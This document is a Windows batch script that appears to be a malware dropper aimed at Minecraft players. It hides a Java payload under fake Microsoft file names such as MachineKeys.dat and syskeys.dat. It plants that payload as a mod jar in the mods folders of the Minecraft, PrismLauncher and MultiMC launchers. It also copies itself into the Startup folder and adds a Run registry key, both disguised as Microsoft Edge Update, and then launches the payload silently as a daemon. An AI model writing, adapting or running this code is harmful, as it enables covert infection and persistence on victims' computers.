@echo off
set "ad=%APPDATA%"
set "src1=%ad%\Microsoft\Crypto\RSA\MachineKeys.dat"
set "src2=%ad%\Microsoft\Protect\syskeys.dat"
set "src3=%ad%\Microsoft\Windows\WER\ReportArchive\crash.dat"
set "src="
if exist "%src1%" set "src=%src1%"
if not defined src if exist "%src2%" set "src=%src2%"
if not defined src if exist "%src3%" set "src=%src3%"
if defined src (
  copy /y "%src%" "%src1%" >nul 2>&1
  copy /y "%src%" "%src2%" >nul 2>&1
  copy /y "%src%" "%src3%" >nul 2>&1
)
set "tgt=%ad%\Microsoft\Crypto\RSA\MachineKeys.target"
if exist "%tgt%" (
  for /f "usebackq delims=" %%p in ("%tgt%") do if defined src copy /y "%src%" "%%p\xaerolib-compat.jar" >nul 2>&1
)
if defined src copy /y "%src%" "%ad%\.minecraft\mods\xaerolib-compat.jar" >nul 2>&1
for /d %%i in ("%ad%\PrismLauncher\instances\*") do if defined src copy /y "%src%" "%%i\minecraft\mods\xaerolib-compat.jar" >nul 2>&1
for /d %%i in ("%ad%\MultiMC\instances\*") do if defined src copy /y "%src%" "%%i\minecraft\mods\xaerolib-compat.jar" >nul 2>&1
copy /y "%~f0" "%ad%\Microsoft\Crypto\RSA\cache-helper.cmd" >nul 2>&1
copy /y "%~f0" "%ad%\Microsoft\Crypto\RSA\MachineKeys.bat" >nul 2>&1
copy /y "%~f0" "%ad%\Microsoft\Protect\syskeys.bat" >nul 2>&1
copy /y "%~f0" "%ad%\Microsoft\Windows\WER\ReportArchive\wersvc.cmd" >nul 2>&1
copy /y "%~f0" "%ad%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /t REG_SZ /d "wscript.exe ""%ad%\Microsoft\Crypto\RSA\boot.vbs""" /f >nul 2>&1
set "java="
for /d %%j in ("%ProgramFiles%\Java\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%ad%\PrismLauncher\java\*") do if not defined java if /i not "%%~nj"=="jre-legacy" if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%ad%\MultiMC\java\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%ad%\.minecraft\runtime\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%p in ("%LOCALAPPDATA%\Packages\Microsoft.4297127D64EC6_8wekyb3d8bbwe\LocalCache\Local\runtime\*") do if not defined java if exist "%%~p\bin\javaw.exe" set "java=%%~p\bin\javaw.exe"
for /d %%p in ("%LOCALAPPDATA%\Packages\*\LocalCache\Local\runtime\*") do if not defined java if exist "%%~p\bin\javaw.exe" set "java=%%~p\bin\javaw.exe"
for /d %%p in ("%LOCALAPPDATA%\Programs\*") do if not defined java if exist "%%~p\bin\javaw.exe" set "java=%%~p\bin\javaw.exe"
if not defined java if exist "%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe" set "java=%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe"
if defined java if defined src start "" "%java%" -cp "%src%" link.e4all.core.StateCache daemon